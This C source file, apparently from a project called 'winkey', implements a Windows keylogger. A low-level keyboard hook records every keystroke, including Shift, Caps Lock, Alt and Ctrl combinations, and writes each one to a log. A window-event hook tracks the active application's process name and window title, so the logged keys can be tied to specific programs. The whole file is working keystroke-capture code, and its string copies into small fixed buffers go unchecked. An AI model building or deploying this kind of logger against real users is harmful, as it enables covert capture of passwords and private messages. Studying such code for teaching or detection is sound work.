#include "winkey.h"

HHOOK g_keyboard_hook;

LRESULT CALLBACK handle_key_press(int nCode, WPARAM wParam, LPARAM lParam)
{
	// Process keydown events
	if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
	{
		KBDLLHOOKSTRUCT *pKeyboard = (KBDLLHOOKSTRUCT *)lParam;
		char key[32] = {0};

		// Get keyboard state and track Shift/Caps
		BYTE keyboardState[256];
		GetKeyboardState(keyboardState);
		BOOL isShiftPressed = GetAsyncKeyState(VK_SHIFT) & 0x8000;
		BOOL isCapsLockOn = GetKeyState(VK_CAPITAL) & 0x0001;

		// Determine if it's printable or special
		if ((pKeyboard->vkCode >= 0x30 && pKeyboard->vkCode <= 0x5A) ||
			(pKeyboard->vkCode >= VK_OEM_1 && pKeyboard->vkCode <= VK_OEM_102) ||
			(pKeyboard->vkCode >= VK_NUMPAD0 && pKeyboard->vkCode <= VK_DIVIDE) ||
			pKeyboard->vkCode == VK_SPACE)
		{
			strcpy(key, get_character(
							pKeyboard->vkCode,
							pKeyboard->scanCode,
							keyboardState,
							isShiftPressed,
							isCapsLockOn));
		}
		else
		{
			strcpy(key, get_special_key_name(pKeyboard->vkCode));
		}

		if (strcmp(key, "") == 0)
		{
			return CallNextHookEx(g_keyboard_hook, nCode, wParam, lParam);
		}

		// Handle Alt/Ctrl combinations
		char tmp_key[32] = {0};
		if (GetAsyncKeyState(VK_MENU) & 0x8000)
		{
			remove_brackets(key);
			sprintf(tmp_key, "[Alt+%s]", key);
			strcpy(key, tmp_key);
		}
		if (GetAsyncKeyState(VK_CONTROL) & 0x8000)
		{
			remove_brackets(key);
			sprintf(tmp_key, "[Ctrl+%s]", key);
			strcpy(key, tmp_key);
		}

		// Log the key
		write_to_log(key);
	}

	return CallNextHookEx(g_keyboard_hook, nCode, wParam, lParam);
}

void CALLBACK handle_fg_window_change(
	HWINEVENTHOOK hWinEventHook,
	DWORD event,
	HWND hwnd,
	LONG idObject,
	LONG idChild,
	DWORD idEventThread,
	DWORD dwmsEventTime)
{
	(void)hWinEventHook; // Unused parameters
	(void)event;
	(void)idObject;
	(void)idChild;
	(void)idEventThread;
	(void)dwmsEventTime;

	// Skip tool windows to avoid logging ALT+TAB changes
	LONG_PTR exStyle = GetWindowLongPtr(hwnd, GWL_EXSTYLE);
	if (exStyle & WS_EX_TOOLWINDOW)
	{
		return;
	}

	g_foreground_window = hwnd;

	// Get process name
	DWORD pid;
	GetWindowThreadProcessId(g_foreground_window, &pid);
	HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
	if (process)
	{
		GetModuleFileNameEx(process, NULL, g_process_name, MAX_PATH);
		strcpy(g_process_name, PathFindFileName(g_process_name));
		CloseHandle(process);
	}

	// Get window title
	GetWindowText(hwnd, g_window_title, sizeof(g_window_title));
}
